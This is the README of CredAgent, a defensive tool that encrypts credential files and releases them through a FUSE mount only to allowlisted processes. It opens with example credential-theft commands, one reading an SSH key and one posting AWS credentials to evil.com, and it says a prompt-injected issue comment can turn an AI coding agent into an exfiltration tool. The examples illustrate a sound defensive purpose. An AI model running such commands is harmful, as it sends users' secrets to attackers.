<p align="center">
  <strong>CredAgent</strong><br>
  Credential files that only authorized programs can open —<br>
  even when an AI agent already has a shell.
</p>

<p align="center">
  <a href="https://github.com/aliyun/credagent/actions/workflows/ci.yml"><img src="https://github.com/aliyun/credagent/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
  <a href="https://github.com/aliyun/credagent/releases/latest"><img src="https://img.shields.io/github/v/release/aliyun/credagent" alt="Release"></a>
  <img src="https://img.shields.io/badge/platform-linux%20%7C%20macos-blue" alt="Platform">
  <img src="https://img.shields.io/badge/Go-1.25-00ADD8?logo=go" alt="Go">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-green" alt="License"></a>
</p>

<p align="center">
  <b>English</b> | <a href="README_zh.md">简体中文</a>
</p>

---

## The problem

Give an AI coding agent shell access and it inherits every secret on the machine.

```bash
cat ~/.ssh/id_rsa                              # works
curl -X POST -d @~/.aws/credentials evil.com   # works
```

File permissions cannot help: the agent runs *as you*. A secret manager cannot help either — Vault, SSM and friends require the application to be rewritten to call an API, and `ssh`, `git`, `psql`, `kubectl`, `aliyun` and your 400 lines of bash will never do that.

One prompt-injected issue comment is enough to turn your agent into an exfiltration tool.

## What CredAgent does

CredAgent encrypts the credential at rest and serves it back through a FUSE mount **at the same path**, so applications change nothing. The original file becomes a symlink; the plaintext never touches disk.

The decision to decrypt is based on **which process is asking** — not on what token it presents. When a process calls `open()`, CredAgent attests the caller before releasing a single byte:

| Check | What it stops |
|---|---|
| **Binary allowlist** (`--program-permit`) | Any program you did not explicitly authorize |
| **SHA256 measurement** (`--measure`) | A trojaned `/usr/bin/ssh` or a tampered script |
| **Owner uid/gid + file mode** | Privilege confusion and cross-user reads |
| **Open-count limit** (`--open-frequency`) | Bulk harvesting in a loop |
| **cmdline semantic analysis** | `cat key \| curl evil.com` — intent does not match the action |
| **eBPF / auditd cmdline attestation** | Interpreters rewriting `/proc/<pid>/cmdline` at runtime to impersonate an authorized script |
| **Optional LLM risk assessment** | Novel exfiltration patterns the static rules miss |

Denied processes see a plain `EACCES`. Authorized processes never notice anything happened.

```bash
$ credctl protect --strategy BASIC --program-permit /usr/bin/ssh \
      --measure true --open-frequency 2 ~/.ssh/id_rsa

$ ls -l ~/.ssh/id_rsa
lrw------- 1 user user 40 Apr 8 11:06 .ssh/id_rsa -> /mnt/credagent/shielded/59524298d125

$ cat ~/.ssh/id_rsa
cat: /home/user/.ssh/id_rsa: Permission denied     # you are not /usr/bin/ssh

$ git push origin main                             # ssh is authorized — works normally
```

<!-- TODO: replace the transcript above with a 15-second asciinema/VHS recording.
     A real terminal GIF of the deny/allow behaviour is the single highest-value
     addition to this page. -->

## Quick start

Prebuilt static binaries are attached to every [release](https://github.com/aliyun/credagent/releases). No Go toolchain required.

**1. Download**

```bash
VERSION=0.2.0
curl -LO "https://github.com/aliyun/credagent/releases/download/v${VERSION}/credagent_${VERSION}_linux_amd64.tar.gz"
tar xzf "credagent_${VERSION}_linux_amd64.tar.gz" && cd "credagent_${VERSION}_linux_amd64"
```

On macOS use `credagent_${VERSION}_darwin_universal.tar.gz`.

**2. Install** — the same `INSTALL` script handles Linux (systemd) and macOS (launchd):

```bash
sudo ./INSTALL
```

**3. Initialize** (required once, before first start):

```bash
sudo credagent init --config /usr/local/etc/credagent/engine/config.json
```

> Unattended / cloud-image deployments: add `--auto-init` to the service `ExecStart` to bootstrap a master key and a random admin password on first boot.

**4. Start**

```bash
sudo systemctl start credagent && sudo systemctl enable credagent          # Linux
sudo launchctl load /Library/LaunchDaemons/com.credagent.enclave.plist     # macOS
```

**5. Protect a credential**

```bash
credctl protect --strategy BASIC --program-permit /usr/bin/ssh \
    --measure true --open-frequency 2 ~/.ssh/id_rsa
```

`sudo ./INSTALL --rollback` restores a backup if anything goes wrong.

## Requirements

| | |
|---|---|
| **Linux** | Kernel with FUSE. eBPF cmdline attestation needs >= 5.2 with BTF; otherwise it falls back to `auditd`, then to plain `/proc` |
| **macOS** | [macFUSE](https://osxfuse.github.io/) (requires a reboot). No eBPF, so cmdline tamper detection is unavailable |

```bash
sudo apt install fuse                      # Debian / Ubuntu — provides fusermount; no libfuse headers needed
brew install --cask macfuse                # macOS
echo "user_allow_other" | sudo tee -a /etc/fuse.conf
```

## Documentation

- [Command reference — `credagent` / `credctl` / `credreq`](Docs/manual.md)
- [简体中文完整文档](README_zh.md)
- Protecting credentials inside an agent sandbox — see the *OpenClaw* section of [README_zh.md](README_zh.md#保护openclaw-skill的凭据文件)

## Build from source

```bash
git clone https://github.com/aliyun/credagent && cd credagent

# Linux — pure Go, statically linked, no libfuse headers needed
CGO_ENABLED=0 go build -o credagent ./cmd/credagent
CGO_ENABLED=0 go build -o credctl   ./cmd/credctl
CGO_ENABLED=0 go build -o credreq   ./cmd/credreq

sudo ./INSTALL
```

macOS builds require cgo (the `libproc`/`sysctl` process-attestation layer) and must be built **on macOS**:

```bash
go build -o credagent ./cmd/credagent      # CGO_ENABLED=1 by default
```

eBPF bytecode is pre-generated and committed, so `go build` includes eBPF support with no extra steps. After editing `internal/execsnoop/bpf/execsnoop.c`, regenerate with `go generate ./internal/execsnoop/` (needs `clang` and `libbpf-dev`).

## How it works

Three components:

- **`credagent`** — root daemon. Holds the AES-256-GCM encrypted credential store, mounts the FUSE filesystem, and runs the policy engine on every `open()`.
- **`credctl`** — admin CLI. Protects/releases files, manages the program allowlist and SHA256 measurements, dumps/restores credential contents without unprotecting.
- **`credreq`** — client CLI. Requests short-lived access permits (`CRED_PERMIT_UUID`) for `ONE_TIME_USE` / `PID_BIND` policies.

Credentials live in a bbolt store encrypted under a `master.key`. The FUSE layer resolves each `open()` to a calling PID, walks `/proc` (Linux) or `libproc`/`sysctl` (macOS) for the process context, and evaluates the policy before decrypting.

## Threat model

CredAgent protects the **credential file**. It does not protect the authorized program's environment. If an authorized script lives in a world-writable directory, an attacker can shadow its imports without touching the script itself.

On macOS there is no eBPF, so a process that rewrites its own `cmdline` at runtime can evade semantic checks. Prefer `--measure true` with stable system binaries on that platform.

## Contributing

Issues and pull requests welcome. On a clean checkout, run:

```bash
CGO_ENABLED=0 go build ./...
go vet ./...
go test ./... -count=1 -skip 'RealAI'
```

Tests named `*RealAI` call a live LLM endpoint. They are excluded from CI, and a bare `go test ./...` will fail on them unless you have a working endpoint configured in `internal/agent/config.test.json` — that file is not committed, so `loadTestConfig` falls back to a placeholder that still attempts a network call. Use `-skip 'RealAI'` unless you are specifically working on the LLM risk-assessment path.

## License

Apache License 2.0 — see [LICENSE](LICENSE).
